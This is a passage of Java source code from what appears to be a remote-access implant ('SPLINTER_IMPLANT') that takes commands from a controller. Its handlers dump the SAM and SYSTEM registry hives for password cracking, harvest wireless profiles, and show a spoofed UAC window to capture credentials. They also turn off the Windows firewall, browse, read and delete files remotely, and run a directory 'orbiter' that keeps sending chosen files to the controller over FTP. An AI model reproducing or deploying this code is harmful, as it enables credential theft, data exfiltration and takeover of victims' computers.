				File fleXP_ChromeBrowsingHistory = new File("C:\\Documents and Settings\\" + systemMap.strUserName + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data");
				File fleVista_ChromeBrowsingHistory = new File("C:\\Users\\" + systemMap.strUserName + "\\AppData\\Local\\Google\\Chrome\\User Data");
				
				if(fleXP_ChromeBrowsingHistory != null && fleXP_ChromeBrowsingHistory.exists() && fleXP_ChromeBrowsingHistory.isDirectory())
				{
					//we're on an XP machine
					directoryToList = fleXP_ChromeBrowsingHistory;
				}
				else if()
				{
					
				}
				
				//CONVERT ARRAY INTO ARRAYLIST (THIS MAKES MORE COMPATIBLE FOR ORBITER PAYLOAD TO COME ;-)  )
				
				//PASS THE ARRAY LISTING TO THE FILE SENDER BY TYPE!
				
				//INSTANTIATE THE FILE SENDER THREAD!
			}*/
			
			/*******************************************************
			 * HARVEST WIRELESS PROFILE
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.HARVEST_WIRELESS_PROFILE))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == HARVEST_WIRELESS_PROFILE
				//[2] == <SAVE DIRECTORY>
				//[3] == CONTROLLER FTP ADDRESS
				//[4] == CONTROLLER FTP PORT
				//[5] == 
				//[6] == 
				//[7] == 
				PrintWriter pwFileOut = null;
				try
				{
					//run the command locally here... not calling a new class to handle these functions
					
					//create the new file to be written
					String outDirectory = cmd[2];
					String FTP_Addr = cmd[3];
					int FTP_Port = Integer.parseInt(cmd[4]);
					File fleProfile = null;
					
					//create the out file
					if(outDirectory == null || outDirectory.trim().equals(""))
					{
						fleProfile = new File("." + Driver.fileSeperator, "_" + "wireless_profile" + ".txt");
					}
					else//directory is good, create the file at this directory
					{
						fleProfile = new File(outDirectory, "_" + "wireless_profile" + ".txt");
					}
					
					//Assuming our temp file was created, open a print writer on the file (this will really drop the file on the system, if successful, we'll proceed with the command
					pwFileOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleProfile.toString())));
					
					//execute the command and write the results out to the file
					
					/*********************************************************************************************
					 * WRITE SYSTEM TIME
					 *********************************************************************************************/									
					this.sendToController("Commencing Harvest of Wireless Profiles (if applicable) started @ " + Driver.getTimeStamp_Updated(), false, true);
					
					//Execute command
					Process process = Runtime.getRuntime().exec(EnumerateSystem.ENUMERATE_WIRELESS_PROFILE);
					
					//note!!!! we still have to clear the process buffer, otherwise the system will return "ERROR: Not enough storage is available to complete this operation." <---- this is because all data is consumed since the process buffer is still full.  so to get around this, we will simply call the processhandlers to drain the process buffers
					
					BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
					BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
								
					ProcessHandlerThread process_INPUT = new ProcessHandlerThread(EnumerateSystem.ENUMERATE_WIRELESS_PROFILE, process, process_IN, pwFileOut);
					ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(EnumerateSystem.ENUMERATE_WIRELESS_PROFILE, process, process_IN_ERROR, pwFileOut); 
					
					process_INPUT.start();
					process_INPUT_ERROR.start();
					
					//clean up the system
					System.gc();
					
					pwFileOut.flush();
					pwFileOut.close();
					
					this.sendToController("WIRELESS PROFILE HARVEST COMPLETE. Searching for Controller to FTP results...", false, true);
					
					FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Addr, FTP_Port, FTP_ServerSocket.maxFileReadSize_Bytes, fleProfile, pwOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
					FTP_Sender.start();
					
					//SOLO!!! ALSO CONSIDER THE OTHER FOLDE PROFILE=. COMMAND IN THE WINDOWS EXPLOITATION CHEET SHEET
					
				}catch(Exception e){this.sendToController("Unable to Harvest Wireless Profile!", false, false);try{pwFileOut.close();}catch(Exception ee){}}
				
			
			}
			
			/*******************************************************
			 * HARVEST REGISTRY HASHES
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.HARVEST_REGISTRY_HASHES))
			{
				//use registry, elevate to admin and run, or create localadmin group, elevate to admin and run, or schedule an "at" task or task scheduler to run as administrator/or system
				
				//NOTE, THE BELOW ASSUMES WE HAVE ADMIN CREDS ON THE BOX WE'RE RUNNING THE REG SAVE COMMANDS FROM
				
				//execute:
				//reg.exe save HKLM\SAM sam /y <-- to force overwrite
				//reg.exe save HKLM\SYSTEM system /y <-- force yes to overwrite
				
				//http://forum.md5decrypter.co.uk/topic229-manually-save-sam-system-registry-hives.aspx
				//at 15:00 reg SAVE HKLM\SECURITY [drive]:\security.hive
				//at \\[machine] 15:00 reg SAVE HKLM\SECURITY [drive]:\security.hive
				
				//will then have to port raw hive into pw crack tool that understands registry format: e.g. Cain and Abel, or creddump
				
				//[0] == [SPLINTER_IMPLANT]
				//[1] == HARVEST REGISTRY HASHES
				//[2] == <SAVE DIRECTORY>
				//[3] == CONTROLLER FTP ADDRESS
				//[4] == CONTROLLER FTP PORT
				//[5] == 
				//[6] == 
				//[7] == 
				
				try
				{
					//run the command locally here... not calling a new class to handle these functions
					
					//create the new file to be written
					String outDirectory = cmd[2];
					String FTP_Addr = cmd[3];
					int FTP_Port = Integer.parseInt(cmd[4]);
					File fleSAM = null;
					File fleSYSTEM = null;
					
					//create the out file
					if(outDirectory == null || outDirectory.trim().equals(""))
					{
						fleSAM = new File("." + Driver.fileSeperator, "SAM" + "_" + this.randomNumberReceived + ".hive");
						fleSYSTEM = new File("." + Driver.fileSeperator, "SYSTEM" + "_" + this.randomNumberReceived + ".hive");
					}
					else//directory is good, create the file at this directory
					{
						fleSAM = new File(outDirectory, "SAM" + "_" + this.randomNumberReceived + ".hive");
						fleSYSTEM = new File(outDirectory, "SYSTEM" + "_" + this.randomNumberReceived + ".hive");
					}
					
					
					//assuming the file creation occured without a problem, call the appropriate mtds to save the hive and FTP over to the controller
					
					/*********************************************************************************************
					 * WRITE SYSTEM TIME
					 *********************************************************************************************/									
					this.sendToController("Commencing Harvest of System PW Registry Hashes started @ " + Driver.getTimeStamp_Updated(), false, true);
					
					//execute command and FTP results
					
					String fullCmd_SAM = "reg save HKLM\\SAM " + "\"" + fleSAM.getCanonicalPath() + "\"" + " /y";
					String fullCmd_SYSTEM = "reg save HKLM\\SYSTEM " + "\"" + fleSYSTEM.getCanonicalPath() + "\"" + " /y";
					
					saveHashes(fullCmd_SAM, fleSAM, "HARVEST REGISTRY SAM HASHES COMPLETE.", FTP_Addr, FTP_Port, pwOut);
					saveHashes(fullCmd_SYSTEM, fleSYSTEM, "HARVEST REGISTRY SYSTEM HASHES COMPLETE.", FTP_Addr, FTP_Port, pwOut);
															
					
				}catch(Exception e){this.sendToController("Unable to Harvest Wireless Profile!", false, false);}
				
			
			}
			
			/*******************************************************
			 * DISPLAY SPOOFED WINDOWS UAC FRAME
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.SPOOF_UAC))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == SPOOF_UAC
				//[2] == <SPOOF PROGRAM TITLE>
				//[3] == <PATH TO EXECUTABLE TO LAUNCH AFTER WE HAVE CREDENTIALS>
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				//ASSUME THE COMMAND IS ALREADY NORMALIZED THUS, NO ERROR CHECKING HERE!
				
				if(spoof != null && (spoof.isShowing() || spoof.isActive() || spoof.isBackgroundSet()))
				{
					try {spoof.dispose();}catch(Exception e){}
				}
				
				spoof = new Frame_SpoofUAC(cmd[2], cmd[3], this);
				
				try
				{
					spoof.jtfUserName.setText(Driver.systemMap.strUserName);
				}
				catch(Exception e)
				{
					spoof.jtfUserName.setText("User Name");
				}
				
				spoof.setVisible(true);
				
			}
			
			
			/*******************************************************
			 * DISABLE WINDOWS FIREWALL --> ATTEMPT
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DISABLE_WINDOWS_FIREWALL))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == DISABLE_WINDOWS_FIREWALL
				//[2] == 
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				this.sendToController("\nAttempting to disable firewall...\n", false, false);
				//this.executeCommand("netsh firewall set opmode disable", pwOut); //THIS IS THE OLD, DEPRECATED WAY
				this.executeCommand("netsh advfirewall set allprofiles state off", pwOut);
				this.sendToController("\nCommand executed, refreshing current firewall configuration...\n", false, false);
				this.executeCommand("netsh advfirewall show allprofiles", pwOut);
				
				//use  netsh advfirewall show allprofiles to view the current state
				
			}
			
			/*******************************************************
			 * ENABLE WINDOWS FIREWALL --> ATTEMPT
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.ENABLE_WINDOWS_FIREWALL))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == ENABLE_WINDOWS_FIREWALL
				//[2] == 
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				//this.executeCommand("netsh firewall set opmode enable", pwOut); //THIS IS THE OLD, DEPRECATED WAY
				this.sendToController("\nAttempting to enable firewall...\n", false, false);
				this.executeCommand("netsh advfirewall set allprofiles state on", pwOut);
				this.sendToController("\nCommand executed, refreshing current firewall configuration...\n", false, false);
				this.executeCommand("netsh advfirewall show allprofiles", pwOut);
				
				//use  netsh advfirewall show allprofiles to view the current state
			}
			
			/*******************************************************
			 * DISPLAY WINDOWS FIREWALL --> ATTEMPT
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.DISPLAY_WINDOWS_FIREWALL))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == DISPLAY_WINDOWS_FIREWALL
				//[2] == 
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				//this.executeCommand("netsh firewall set opmode enable", pwOut); //THIS IS THE OLD, DEPRECATED WAY
				//this.executeCommand("netsh advfirewall set allprofiles state on", pwOut);
				this.executeCommand("netsh advfirewall show allprofiles", pwOut);
				
				//also consider the way we show the firewall profiles in the enumeration thread as well
			}
			
			
			/*******************************************************
			 * INITIATE FILE BROWSER --> RETURN FILE ROOTS!
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.FILE_BROWSER_INITIATE))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == INITIATE_FILE_BROWSER
				//[2] == 
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				try
				{
					this.sendToController("Initiating File Browser. Please stand by...", false, false);
					fsv = FileSystemView.getFileSystemView();
					arrFileRoot = fsv.getRoots();
					
					//String fileSystemRoot = (String)arrFileRoot[0];//
					//File fleHomeDirectory = fsv.getHomeDirectory();
					//File fleDefaultDirectory = fsv.getDefaultDirectory();
					
					try
					{
						this.myFileBrowserCurrentFile = fsv.getHomeDirectory();
						myFileBrowserNewFile = fsv.getHomeDirectory();
					}catch(Exception e){myFileBrowserCurrentFile = new File(".");}
					
					/*Driver.sop("Roots: ");
					for(int i = 0; i < arrFileRoot.length; i++)
					{
						this.sendToController(Driver.FILE_BROWSER_MESSAGE + i + ": " + arrFileRoot[i], false, true);
					}*/
					
					arrFileRoot = File.listRoots();
					File root = null;
					Object_FileBrowser objFile = null;
					
					//ALERT controller file root data is coming
					this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.BEGIN_FILE_BROWSER_FILE_ROOTS, false, false);
					for(int i = 0; i < arrFileRoot.length; i++)
					{
						root = arrFileRoot[i];
						/*this.sendToController("Is Drive: " + fsv.isDrive(root), false, true);
						this.sendToController("Drive: " + root, false, true);
						this.sendToController("Display name: " + fsv.getSystemDisplayName(root), false, true);
						this.sendToController("Is File System: " + fsv.isFileSystem(root), false, true);
						this.sendToController("Is Floppy: " + fsv.isFloppyDrive(root), false, true);
						this.sendToController("Is Directory: " + root.isDirectory(), false, true);
						this.sendToController("Is File: " + root.isFile(), false, true);
						this.sendToController("Is Hidden: " + root.isHidden(), false, true);
						this.sendToController("Is Traversable: " + fsv.isTraversable(root), false, true);				
						this.sendToController("Can Read: " + root.canRead(), false, true);
						this.sendToController("Can Write: " + root.canWrite(), false, true);
						this.sendToController("Can Execute: " + root.canExecute(), false, true);		
						this.sendToController("Full Path: " + root.getCanonicalPath(), false, true);
						this.sendToController("Parent Directory: " + fsv.getParentDirectory(root), false, true);
						this.sendToController("Date Last Modified: " + root.lastModified(), false, true);		
						this.sendToController("Total space: " + root.getTotalSpace(), false, true);
						this.sendToController("Usable space: " + root.getUsableSpace(), false, true);
						this.sendToController("\n\n", false, true);*/						
						
						//CREATE A FILE_BROWSER OBJECT BASED ON THE ATTRIBUTES HERE (THIS WILL BE THE EXACT SAME PARAMETERS FOR THE CONTROLLER, THUS WE ENSURE COMPATABILITY HERE!
						objFile = new Object_FileBrowser(fsv.isDrive(root), root, fsv.getSystemDisplayName(root), fsv.isFileSystem(root), fsv.isFloppyDrive(root),  root.isDirectory(), root.isFile(), root.isHidden(), fsv.isTraversable(root), root.canRead(), root.canWrite(), root.canExecute(), root.getCanonicalPath(), fsv.getParentDirectory(root), root.lastModified(), root.getTotalSpace(), root.getUsableSpace(), root.length());
						
						this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.FILE_BROWSER_FILE_ROOTS + Driver.delimeter_1 + objFile.getFileObjectData_Socket(Driver.delimeter_2), false, false);
					}
					
					//ALERT controller file root data is complete
					this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.END_FILE_BROWSER_FILE_ROOTS, false, false);
					
				}
				catch(Exception e)
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "*\n*\n*ERROR: UNABLE TO LOAD FILE ROOTS TO BROWSER SYSTEM \n*\n*\n*\n", false, false);
				}
				
			}
			
			
			/*******************************************************
			 * FILE BROWSER --> DELETE FILE OR FOLDER
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.FILE_BROWSER_DELETE_DIRECTORY))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == FILE_BROWSER_DELETE_DIRECTORY
				//[2] == FILE OR DIRECTORY TO (ATTEMPT TO ) DELETE
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				//create the file
				File fleToDelete = new File(cmd[2].trim());
				
				if(!fleToDelete.exists())
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Deletion for file \"" + cmd[2] + "\" received. File no longer exist. Unable to continue...", false, false);
					return true;
				}
				
				//otherwise, delete the file(or folder)
				File parentDirectory = fleToDelete.getParentFile();
				boolean deletionSuccess = deleteFile(fleToDelete);
				
				if(deletionSuccess)
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Deletion for file \"" + fleToDelete.getCanonicalPath() + "\" received. File deletion successful!", false, false);
					
					//deletion process was successful, re-map the parent directory
					mapFilesUnderDirectory(parentDirectory.getCanonicalPath());
				}
				
				else
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Deletion for file \"" + fleToDelete.getCanonicalPath() + "\" received. File deletion FAILED!!! Perhaps Access was Denied to file", false, false);
				}
				
				return true;
				//this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "", false, false);
			}
			
			/*******************************************************
			 * FILE BROWSER --> RETURN FILE UNDER THIS DIRECTORY
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.FILE_BROWSER_MAP_DIRECTORY))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == FILE_BROWSER_MAP_DIRECTORY
				//[2] == [DIRECTORY TO BROWSE]
				//[3] == 
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				try
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Attempting to list files under Directory: " + cmd[2], false, false);
					
					fsv = FileSystemView.getFileSystemView();
					//arrFileList = fsv.getRoots();
					
					//create a new file based on the user's preference
					
					//GEEZ!!!!!!!!!!!!!!  this must be a "JAVA'ism" changing directory to f: works just fine, but c: returns an error, thus, if we want to get to drive c, insert "\" for the root
					if(cmd[2].trim().equalsIgnoreCase("c:") || cmd[2].trim().equalsIgnoreCase("c:" + Driver.fileSeperator))
					{
						this.myFileBrowserNewFile = new File(Driver.fileSeperator);
					}
					else
					{
						if(cmd[2].trim().endsWith(Driver.fileSeperator))
						{
							//this.myFileBrowserNewFile = new File(cmd[2].substring(0, cmd[2].length()-1));
							this.myFileBrowserNewFile = new File(cmd[2].trim());
						}
						else
						{
							this.myFileBrowserNewFile = new File(cmd[2].trim() + Driver.fileSeperator);
						}
						
						//this.myFileBrowserNewFile = new File("F:");
					}
					
					
					
					//ensure we have a new directory to list
					if(myFileBrowserNewFile != null && myFileBrowserNewFile.exists() && !myFileBrowserNewFile.isFile())//could be a directory or a drive
					{
						//accept it and convert it to our current file
						this.myFileBrowserCurrentFile = myFileBrowserNewFile;
					}
					else
					{
						if(myFileBrowserCurrentFile == null || !myFileBrowserCurrentFile.exists() || myFileBrowserCurrentFile.isFile())
						{
							myFileBrowserCurrentFile = new File(".");
						}//otherwise, keep previous directory
																								
						this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "* * * * ERROR -->> Invalid directory specified. Returning to list: " + myFileBrowserCurrentFile.getCanonicalPath(), false, false);
					}
					
					//We have some directory!  list it
					arrFileList = myFileBrowserCurrentFile.listFiles();
					
					if(this.arrFileList == null)//IO error occurred or specified directory does not exist
					{
						/*if(myFileBrowserCurrentFile == null || !myFileBrowserCurrentFile.exists() || myFileBrowserCurrentFile.isFile())
						{
							myFileBrowserCurrentFile = new File(Driver.fileSeperator);
						}*/
						
						myFileBrowserCurrentFile = new File(Driver.fileSeperator);
						
						this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "* * * ERROR -->>>> Invalid directory specified. Directory doesn't seem to exist or access was denied... Returning listing of: " + myFileBrowserCurrentFile.getCanonicalPath(), false, false);

						arrFileList = myFileBrowserCurrentFile.listFiles();
						
					}
					
					else if(arrFileList.length < 1)
					{
						//nothing under this directory
						this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + Driver.EMPTY_DIRECTORY_MESSAGE + myFileBrowserCurrentFile.getCanonicalPath(), false, false);
						
						//return a blank listing to the user
						//this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.FILE_BROWSER_EMPTY_DIRECTORY + Driver.delimeter_1 + myFileBrowserCurrentFile.getCanonicalPath(), false, false);
						
						//[0] == unique delimiter
						//[1] == FILE_BROWSER_EMPTY_DIRECTORY
						//[2] == directory full path
						//[3] == directory object tokens
						
						Object_FileBrowser objFile = new Object_FileBrowser(fsv.isDrive(myFileBrowserCurrentFile), myFileBrowserCurrentFile, fsv.getSystemDisplayName(myFileBrowserCurrentFile), fsv.isFileSystem(myFileBrowserCurrentFile), fsv.isFloppyDrive(myFileBrowserCurrentFile),  myFileBrowserCurrentFile.isDirectory(), myFileBrowserCurrentFile.isFile(), myFileBrowserCurrentFile.isHidden(), fsv.isTraversable(myFileBrowserCurrentFile), myFileBrowserCurrentFile.canRead(), myFileBrowserCurrentFile.canWrite(), myFileBrowserCurrentFile.canExecute(), myFileBrowserCurrentFile.getCanonicalPath(),myFileBrowserCurrentFile.getParentFile(), myFileBrowserCurrentFile.lastModified(), myFileBrowserCurrentFile.getTotalSpace(), myFileBrowserCurrentFile.getUsableSpace(), myFileBrowserCurrentFile.length());
						
						this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.FILE_BROWSER_EMPTY_DIRECTORY + Driver.delimeter_1 + myFileBrowserCurrentFile.getCanonicalPath() + Driver.delimeter_1 + objFile.getFileObjectData_Socket(Driver.delimeter_2), false, false);
								
						
						
						return true;
						
						//myFileBrowserCurrentFile = new File(Driver.fileSeperator);
						//arrFileList = myFileBrowserCurrentFile.listFiles();
						//arrFileList = new File[]{myFileBrowserCurrentFile};
					}
							
					//otherwise, we have file(s)!!!
					
					File currFile = null;
					Object_FileBrowser objFile = null;
					
					//ALERT controller file list data is coming
					this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.BEGIN_FILE_BROWSER_FILE_LIST, false, false);
					
					//first loop through to display the directories!
					for(int i = 0; i < arrFileList.length; i++)
					{
						currFile = arrFileList[i];							
						
						//CREATE A FILE_BROWSER OBJECT BASED ON THE ATTRIBUTES HERE (THIS WILL BE THE EXACT SAME PARAMETERS FOR THE CONTROLLER, THUS WE ENSURE COMPATABILITY HERE!
						objFile = new Object_FileBrowser(fsv.isDrive(currFile), currFile, fsv.getSystemDisplayName(currFile), fsv.isFileSystem(currFile), fsv.isFloppyDrive(currFile),  currFile.isDirectory(), currFile.isFile(), currFile.isHidden(), fsv.isTraversable(currFile), currFile.canRead(), currFile.canWrite(), currFile.canExecute(), currFile.getCanonicalPath(),currFile.getParentFile(), currFile.lastModified(), currFile.getTotalSpace(), currFile.getUsableSpace(), currFile.length());
						
						this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.FILE_BROWSER_FILE_LIST + Driver.delimeter_1 + objFile.getFileObjectData_Socket(Driver.delimeter_2), false, false);
					}
					
					//ALERT controller file list data is complete
					this.sendToController(this.myUniqueDelimiter +  Driver.delimeter_1 + Driver.END_FILE_BROWSER_FILE_LIST, false, false);
					
				}
				
				
				
				catch(Exception e)
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "**** ERROR: UNABLE TO LOAD FILE ROOTS UNDER SPECIFIED DIRECTORY", false, false);
					
				}
				
			}//END FILE BROWSER IF


			/*******************************************************
			 * DISPLAY SPOOFED WINDOWS UAC FRAME
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.FILE_BROWSER_CREATE_DIRECTORY))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == CREATE_DIRECTORY
				//[2] == PARENT DIRECTORY TO CREATE FILE
				//[3] == NEW DIRECTORY NAME
				//[4] == 
				//[5] == 
				//[6] == 
				//[7] == 
				
				if(cmd[3] == null || cmd[3].trim().equals(""))
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "**** ERROR: INVALID DIRECTORY SPECIFIED. UNABLE TO CREATE NEW DIRECTORY", false, false);					
					return false;
				} 
				
				File fleToCreate = null;
				
				if(cmd[2] == null || cmd[2].trim().equals("") || cmd[2].trim().equals(".") || cmd[2].equals("." + Driver.fileSeperator))
				{
					fleToCreate = Driver.fleCurrentWorkingDirectory;					
				} 
				
				//otherwise, take the full path specified by the controller:
				fleToCreate = new File(cmd[2]);
				
				//ensure we have a valid directory at this point
				if(!fleToCreate.exists() || !fleToCreate.isDirectory())
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "**** ERROR: \"" + fleToCreate + "\" IS AN INVALID DIRECTORY SPECIFIED. UNABLE TO CREATE NEW DIRECTORY", false, false);					
					return true;
				}
				
				//otherwise, create the new directory
				File fleDirectoryToCreate = null;
				if(fleToCreate.getCanonicalPath().endsWith(Driver.fileSeperator))
				{
					fleDirectoryToCreate = new File(fleToCreate.getCanonicalPath() + cmd[3].trim());
				}
				else//add the separator
				{
					fleDirectoryToCreate = new File(fleToCreate.getCanonicalPath() + Driver.fileSeperator + cmd[3].trim());
				}
								
				//ensure directory doesnt exist before creating it!
				if(fleDirectoryToCreate.exists() || fleDirectoryToCreate.isDirectory())
				{					
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "**** ERROR: \"" + fleDirectoryToCreate.getCanonicalPath() + "\" ALREADY EXISTS!!!!", false, false);					
					return true;
				}
				
				//otherwise, attempt to create the directory
				boolean success = fleDirectoryToCreate.mkdir();
				if(success)
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "SUCCESS!: \"" + fleDirectoryToCreate.getCanonicalPath() + "\" CREATED.", false, false);					
					return this.mapFilesUnderDirectory(fleToCreate.getCanonicalPath());
				}
				else//directory creation error
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "**** ERROR!  Unable to create directory: \"" + fleDirectoryToCreate + "\" Either invalid directory parameters specified or Access was Denied.", false, false);					
					return true;
				}
				
			}
			
			/*******************************************************
			 * CAT A FILE
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.FILE_BROWSER_CAT_FILE))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == CAT_FILE
				//[2] == FULL FILE PATH 
				
				//ASSUME THE COMMAND IS ALREADY NORMALIZED THUS, NO ERROR CHECKING HERE!
				
				File fleToCat = null;
				try
				{
					fleToCat = new File(cmd[2].trim());
						
					if(fleToCat == null)
					{
						throw new Exception("Unknown file received!");
					}
					
				}
				catch(Exception e)
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Invalid file received. Unable to cat file...", false, false);
					return true;
				}
				
				if(!fleToCat.exists())
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Invalid file received. \"" + fleToCat + "\" does not exist.  Unable to cat file...", false, false);
					return true;
				}
				
				if(!fleToCat.isFile())
				{
					this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Invalid command received. \"" + fleToCat + "\" is not a file.  Only attempt to cat files...", false, false);
					return true;
				}
				
				//otherwise, we have a file that exists, attempt to read the file
				
				this.sendToController(this.myUniqueDelimiter  + Driver.delimeter_1 +  Driver.FILE_BROWSER_MESSAGE + Driver.delimeter_1 + "Executing command \"" + "cat " + fleToCat.getCanonicalPath() + "\"", false, false);
				this.catFile(this.myUniqueDelimiter  + Driver.delimeter_1 + Driver.FILE_BROWSER_MESSAGE, fleToCat);
				
				return true;
			}
			
			/*******************************************************
			 * ORBITER PAYLOAD 
			 *******************************************************/
			if(cmd[1].trim().equalsIgnoreCase(Driver.ORBIT_DIRECTORY))
			{
				//[0] == [SPLINTER_IMPLANT]
				//[1] == ORBIT_DIRECTORY
				//[2] == ORBIT DIRECTORY PATH
				//[3] == FILE TYPES TO EXFILTRATE
				//[4] == ENABLE RECURSIVE DIRECTORY
				//[5] == MILLIS TO DELAY BEFORE RESCAN
				//[6] == CONTROLLER FTP ADDRESS
				//[7] == CONTROLLER FTP PORT
				
				String directoryPath = cmd[2].trim();;
				String exfiltrationFileType = cmd[3].trim();;		//turn this into delimeter 2 to carry multiple types at once		
				String enableRecursiveDirectoryTraversal = cmd[4].trim();;
				String delayMillis = cmd[5].trim();
				String addressToController = cmd[6].trim();
				String portToController = cmd[7].trim();
				
				boolean recursiveDirectoryTraversal = false;
				int wakeAndScanDelayInterval = 1000;
				int port = 21;
				File fleDirectoryToOrbit = null;
				
				if(enableRecursiveDirectoryTraversal.trim().equalsIgnoreCase("true"))
				{
					recursiveDirectoryTraversal = true;
				}
				
				try
				{
					wakeAndScanDelayInterval = Integer.parseInt(delayMillis);
				}
				catch(Exception ee)
				{
					Driver.sop("Invalid Input Line Specified for timing interval!  Defaulting to " + Driver.ORBIT_DIRECTORY_DELAY_MILLIS + " secs");
					wakeAndScanDelayInterval = Driver.ORBIT_DIRECTORY_DELAY_MILLIS;
				}
				
				try
				{
					port = Integer.parseInt(portToController);
				}
				catch(Exception e)
				{
					this.sendToController("Invalid Port received: " + port + " Unable to begin directory extraction", false, false);
					return true;
				}
				
				try
				{
					fleDirectoryToOrbit = new File(directoryPath.trim());
					
					if(fleDirectoryToOrbit == null || !fleDirectoryToOrbit.exists())
					{
						throw new FileNotFoundException("File not found!");
					}
				}
				catch(FileNotFoundException eee)
				{
					this.sendToController("Invalid orbit directory specified: " + directoryPath + " Unable to begin directory extraction", false, false);
					return true;
				}
				
				//otherwise, we have good data, begin the extraction!
				
				this.sendToController("Initiating Directory Orbit. Parameters: " + directoryPath + Driver.fileSeperator + exfiltrationFileType + " recursive exfiltration: " + recursiveDirectoryTraversal + " " + " Timing delay: " + wakeAndScanDelayInterval/1000 + "secs  Address To Controller: " + addressToController + ":" + portToController, false, false);
				
				Directory_Orbiter directoryOrbiter = new Directory_Orbiter(fleDirectoryToOrbit, exfiltrationFileType, recursiveDirectoryTraversal, wakeAndScanDelayInterval, addressToController, port, this);
				directoryOrbiter.start();
			}
			
			/*******************************************************
			 * KILL SWITCH (WE HAVE 2 KILL SWITHES)
			 *******************************************************/
